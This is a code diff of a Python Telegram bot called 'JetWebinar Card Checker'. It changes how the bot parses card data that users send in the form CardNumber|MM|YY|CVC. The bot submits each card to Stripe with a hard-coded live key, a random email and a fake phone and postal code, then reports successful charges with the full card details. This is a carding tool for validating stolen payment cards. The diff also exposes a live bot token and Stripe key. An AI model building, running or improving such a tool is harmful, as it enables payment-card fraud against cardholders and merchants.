@@ -2,7 +2,6 @@ import telebot
 import requests
 import random
 import string
-import re
 
 JETWEBINAR_BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
 CHANNEL_ID = -1002170961342
@@ -10,36 +9,39 @@ bot = telebot.TeleBot(JETWEBINAR_BOT_TOKEN)
 
 STRIPE_PUBLISHABLE_KEY = "pk_live_XwmzQS8EjYVv6D6ff4ycSP8W"
 
-def extract_card_details(text):
-    # Accepts any format: 4242 4242 4242 4242 12/34 567, 5275150097242499|09|28|575, etc.
-    card = re.search(r'\d{13,19}', text.replace(" ", ""))
-    cvc = re.search(r'(\d{3,4})(?!.*\d)', text)
-    exp = re.search(r'(\d{1,2})[\/|\-| ](\d{2,4})', text)
-    return {
-        "card_number": card.group() if card else None,
-        "exp_month": exp.group(1) if exp else None,
-        "exp_year": exp.group(2) if exp else None,
-        "cvc": cvc.group(1) if cvc else None
-    }
-
 def generate_random_email():
     name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
     return f"{name}@gmail.com"
+
+def parse_card_input(text):
+    parts = text.strip().split('|')
+    if len(parts) != 4:
+        return None
+    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
+    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
+        return None
+    return card_number, exp_month.zfill(2), exp_year, cvc
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     bot.send_message(message.chat.id,
         "💳 JetWebinar Card Checker\n"
-        "Send card in any format (spaces, slashes, pipes, etc)."
+        "Send card in this format:\n"
+        "CardNumber|MM|YY|CVC\n"
+        "CardNumber|MM|YYYY|CVC\n"
+        "Example:\n4242424242424242|05|25|123"
     )
 
 @bot.message_handler(func=lambda m: True)
 def card_handler(message):
     try:
-        details = extract_card_details(message.text)
-        if not all(details.values()):
-            bot.reply_to(message, "❌ Could not extract all card details. Please try again.")
-            return
+        parsed = parse_card_input(message.text)
+        if not parsed:
+            return bot.reply_to(message, "❌ Invalid format. Use: CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC")
+
+        card_number, exp_month, exp_year, cvc = parsed
+        if len(exp_year) == 2:
+            exp_year = "20" + exp_year
 
         email = generate_random_email()
         phone = "3144740104"
@@ -53,10 +55,10 @@ def card_handler(message):
             "billing_details[email]": email,
             "billing_details[phone]": phone,
             "billing_details[address][postal_code]": postal_code,
-            "card[number]": details["card_number"],
-            "card[cvc]": details["cvc"],
-            "card[exp_month]": details["exp_month"].zfill(2),
-            "card[exp_year]": details["exp_year"][-2:] if len(details["exp_year"]) > 2 else details["exp_year"],
+            "card[number]": card_number,
+            "card[cvc]": cvc,
+            "card[exp_month]": exp_month,
+            "card[exp_year]": exp_year[-2:],
             "key": STRIPE_PUBLISHABLE_KEY,
             "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
             "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
@@ -109,7 +111,7 @@ def card_handler(message):
             subscription_id = resp_json.get("subscriptionId", "N/A")
             success_msg = (
                 f"✅ JetWebinar Payment Successful!\n"
-                f"Card: {details['card_number']} | {details['exp_month']}/{details['exp_year']} | {details['cvc']}\n"
+                f"Card: {card_number} | {exp_month}/{exp_year} | {cvc}\n"
                 f"Email: {email}\n"
                 f"Subscription ID: {subscription_id}\n"
                 f"Full Response:\n{resp_json}"
